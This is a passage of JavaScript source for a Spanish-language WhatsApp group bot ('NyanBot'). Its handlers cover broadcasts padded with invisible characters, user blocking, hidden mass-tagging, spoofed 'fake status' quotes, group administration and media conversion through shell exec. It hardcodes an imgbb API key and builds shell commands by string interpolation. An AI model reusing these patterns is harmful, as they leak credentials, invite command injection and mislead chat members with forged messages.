͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°`})
						}
reply('Anuncio dado')
} else {
for (let _ of anu) {
sendMess(_.jid, `	°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°\n	[🪀 _NyanBot_]\n🕐Son las *${hora}*\n\n🍃Hoy es *${week1}  ${calender1}*\n\n${args.join(' ')}`)}
}
reply('Anuncio dado')

break
case 'stats':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
texxt = await msg.stats(totalChat1)
await wa.sendFakeStatus(from, texxt, "BOT STATS")
break
case 'bloquear':
samu330.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !itsMe) return reply(mess.only.ownerB)
samu330.blockUser (`${body.slice(8)}@c.us`, "add")
samu330.sendMessage(from, `Usuario bloqueado`, MessageType.text, {
quoted: fliveLoc
  })
  break
case 'desbloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("Tag targer!")
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
await samu330.blockUser (mentioned, "remove")
}
break
case 'salir':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isGroup) return await reply(mess.only.group)
reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async() => {
await help.sleep(3000)
await samu330.groupLeave(from)
})
break

case 'clearall':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
for (let chat of totalChat) {
await samu330.modifyChat(chat.jid, "delete")
}
await wa.sendFakeStatus(from, "Success clear all chat", "success")
break

case 'hidetag':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
await wa.hideTag(from, args.join(" "))
break
case 'imagetag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
if (!isQuotedImage && !isImage) return await reply(`Lalala... *cancion feliz*\nY la imagen pedazo de nada? >:/`)
mediatag = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(mediatag)
await wa.hideTagImage(from, buffer)
break
case 'toimg':
case 'aimg':
if (!isQuotedSticker) return reply(`send sticker and reply with caption ${prefix}toimg`)
if (sam.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
} else {
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
ran = getRandom('.png')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) {
reply(`error\n\n${err}`)
fs.unlinkSync(ran)
} else {
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, MessageType.image, {quoted: sam, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
fs.unlinkSync(ran)
}
})
}
break
case 'agif':
agif = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
reply('*Espera un momento...*')
owgig = await samu330.downloadAndSaveMediaMessage(agif)
var rang = getRandom('.gif')
exec(`ffmpeg -i ${owgig} ${rang}`, (err) => {
fs.unlinkSync(owgig)
if (err) return reply('error')
toptg = fs.readFileSync(rang)
samu330.sendMessage(from, toptg, MessageType.gif, {mimetype: 'video/gif', quoted: faud})
})
break
case 'toptt':
reply(`wait..`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ran = getRandom('.mp3')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) return reply('error')
topt = fs.readFileSync(ran)
samu330.sendMessage(from, topt, MessageType.audio, {mimetype: 'audio/mp4', quoted: faud, ptt:true})
})
break
case 'stickertag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(media)
await wa.hideTagSticker(from, buffer)
break

case 'totag':
if (!isGroup) return reply(mess.only.group)
if ((isMedia && !sam.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group2 = await samu330.groupMetadata(from)
var member = group2['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: fvid
}
ini_buffer = fs.readFileSync(file)
samu330.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
encmediau = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group26 = await samu330.groupMetadata(from)
var member = group26['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: fvid
}
ini_buffer = fs.readFileSync(file)
samu330.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !sam.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group25 = await samu330.groupMetadata(from)
var member = group25['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4', duration: 9999999,
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: faud
}
ini_buffer = fs.readFileSync(file)
samu330.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
} else if ((isMedia && !sam.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group24 = await samu330.groupMetadata(from)
var member = group24['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/gif',
contextInfo: { mentionedJid: mem },
quoted: fvid
}
ini_buffer = fs.readFileSync(file)
samu330.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else if ((isMedia && !sam.message.videoMessage || isQuotedDocument) && args.length == 0) {
encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group23 = await samu330.groupMetadata(from)
var member = group23['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'text/plain',
contextInfo: { mentionedJid: mem },
quoted: fdoc
}
ini_buffer = fs.readFileSync(file)
denz.sendMessage(from, ini_buffer, document, options)
fs.unlinkSync(file)
}  else if ((isMedia && !sam.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
value = args.join(" ")
var group21 = await samu330.groupMetadata(from)
var member = group21['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4', duration: 555555555,
contextInfo: { mentionedJid: mem },
quoted: fvid
}
ini_buffer = fs.readFileSync(file)
samu330.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
reply(`Etiqueta un texto/documento/gif/sticker/audio/video con el comando: ${prefix}totag`)
}
break


case 'promote':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply('Botcito debe ser admin')
if (mentionUser.length == 0) return await reply('Tag member')
await wa.promoteAdmin(from, mentionUser)
await reply(`Tenemos nuevo Admin`)
break
case 'demote':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (mentionUser.length == 0) return await reply('Tag member!')
await wa.demoteAdmin(from, mentionUser)
await reply(`jsjs un adm menos`)
break
case 'admin':
addFilter(from)
var textt = msg.admin(groupAdmins, groupName)
await wa.sendFakeStatus(from, textt, "LIST ADMIN", groupAdmins)
break
case 'link':
addFilter(from)
var link = await wa.getGroupInvitationCode(from)
await wa.sendFakeStatus(from, link, "El lik de este grupo es")
break
case 'grupo':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (args[0] === 'abrir') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
wa.sendFakeStatus(from, "*Success open group*", "GROUP SETTING")
})
} else if (args[0] === 'cerrar') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
wa.sendFakeStatus(from, "*Succes close group*", "GROUP SETTING")
})
} else {
await reply(`Example: ${prefix}${command} open/close`)
}
break

case 'ttp':
addFilter(from)
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const ttp = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${teks}`)
samu330.sendMessage(from, ttp, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'añadir':
addFilter(from)
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Y el numero?')
if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
samu330.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
}
break

case 'antileg':
if (!isGroup) return reply('Este comando es solo para grupos')
if (args.length < 1) return reply('escriba *1* para activar')
if (args[0] === '1') {
if (isAntiLeg) return reply('Ya esta activo')
legion.push(from)
fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
reply('*Modo antilegiones activado✅*')
} else if ((args[0]) === '0') {
var ini = legion.indexOf(from)
legion.splice(ini, 1)
fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
reply('Antilegiones desactivado✔️')
} else {
reply('*1 para activar, 0 para desactivar*')
}
break
case 'nombre':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
var newName = args.join(" ")
samu330.groupUpdateSubject(from, newName).then(() => {
wa.sendFakeStatus(from, "El nombre del grupo se ah cambiao a" + newName, "GROUP SETTING")
})
break
case 'setdesc':
addFilter(from)
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
var newDesc = args.join(" ")
samu330.groupUpdateDescription(from, newDesc).then(() => {
wa.sendFakeStatus(from, "La descripcion del grupo se ah cambiado a" + newDesc, "GROUP SETTING")
})
break
case 'wasted':
addFilter(from)
var imgbb = require('imgbb-uploader')
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
 ;
owgi = await samu330.downloadAndSaveMediaMessage(ger);
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi);
teks = `${anu.display_url}`;
anu1 = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${teks}`);
fs.writeFileSync('wasted.jpg', anu1)
samu330.sendMessage(from, fs.readFileSync('wasted.jpg'), MessageType.image)
} else {
reply('Manda la foto!');
}			
break

case 'sgay':
addFilter(from)	
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
gay = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgig = await samu330.downloadMediaMessage(gay)
await fs.writeFileSync(`./stickgay.jpeg`, owgig)
var imgbb2 = require('imgbb-uploader')
anug = await imgbb2("20a14861e4f7591f3dc52649cb07ae02", './stickgay.jpeg')
txtg = `${anug.display_url}`
sgay = await getBuffer(`https://pecundang.herokuapp.com/api/gay?url=${txtg}`)
const bas642 = `data:image/jpeg;base64,${sgay.toString('base64')}`
var mantap2 = await convertSticker(bas642, `🌈同性恋世界！ = ${sender[0].split('@')[0]}`, `💎NyanBot | Sm330🍒`)
var imageBuffer2 = new Buffer.from(mantap2, 'base64');
samu330.sendMessage(from, imageBuffer2, sticker, {quoted: floc, sendEphemeral: true})
fs.unlinkSync('./stickgay.jpeg')
} else {
reply('Se nesecita una foto para hacer su sticker!');
}	
break

case 'srip':
addFilter(from)	
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
rip = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgir = await samu330.downloadMediaMessage(rip)
await fs.writeFileSync(`./stickrip.jpeg`, owgir)
var imgbb2r = require('imgbb-uploader')
anur = await imgbb2r("20a14861e4f7591f3dc52649cb07ae02", './stickrip.jpeg')
txtr = `${anur.display_url}`
srip = await getBuffer(`https://pecundang.herokuapp.com/api/rip?url=${txtr}`)
const bas642r = `data:image/jpeg;base64,${srip.toString('base64')}`
var mantap2r = await convertSticker(bas642r, `⚰ 安息吧！ = ${sender[0].split('@')[0]}`, `💎NyanBot | Sm330🍒`)
var imageBuffer2r = new Buffer.from(mantap2r, 'base64');
samu330.sendMessage(from, imageBuffer2r, sticker, {quoted: floc, sendEphemeral: true})
fs.unlinkSync('./stickrip.jpeg')
} else {
reply('Se nesecita una foto para hacer su sticker!');
}
break

case 'scarcel':
addFilter(from)	
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
rej = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
reply(mess.wait,{contextInfo: {"forwardingScore": 999, "isForwarded": true}, sendEphemeral: true})
owgir = await samu330.downloadMediaMessage(rej)
await fs.writeFileSync(`./stickc.jpeg`, owgir)
var imgbb2c = require('imgbb-uploader')
anuc = await imgbb2c("20a14861e4f7591f3dc52649cb07ae02", './stickc.jpeg')
txtc = `${anuc.display_url}`
sc = await getBuffer(`https://pecundang.herokuapp.com/api/jail?url=${txtc}`)
const bas642c = `data:image/jpeg;base64,${sc.toString('base64')}`
var mantap2c = await convertSticker(bas642c, `⛓ 入狱！！ = ${sender[0].split('@')[0]}`, `💎NyanBot | Sm330🍒`)
var imageBuffer2c = new Buffer.from(mantap2c, 'base64');
samu330.sendMessage(from, imageBuffer2c, sticker, {quoted: floc, sendEphemeral: true})
fs.unlinkSync('./stickc.jpeg')
} else {
reply('Se nesecita una foto para hacer su sticker!');
}
break

case 'caras':
var imgbb = require('imgbb-uploader')
if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
cara = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
 ;
samsam = await samu330.downloadAndSaveMediaMessage(cara);
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', samsam);
resultc = `${anu.display_url}`;
caras = await getBuffer(`https://api.lolhuman.xyz/api/facedetect?apikey=${api}&img=${resultc}`)
fs.writeFileSync('caras.jpg', caras)
samu330.sendMessage(from, fs.readFileSync('caras.jpg'), MessageType.image, {quoted: fimg, caption: '💠insane💎'})
} else {
reply('*Porfavor etiqueta una imagen con el comando*')
}
break
		
case 'ger':
addFilter(from)
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
var imgbb = require('imgbb-uploader')
if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
reply('*Espera un momento porfavor*')
owgi = await samu330.downloadAndSaveMediaMessage(ger)
anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply('*Uuuu, algo salio mal, intenta de nuevo*')
nobg = fs.readFileSync(rano)
samu330.sendMessage(from, nobg, sticker, {quoted: ftoko})
fs.unlinkSync(rano)
})
                                    
} else {
reply('Se nececita una foto!')
}
				
 break



	case 'antimedia':                
if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)     
if (!botAdmin) return reply(mess.only.Badmin)
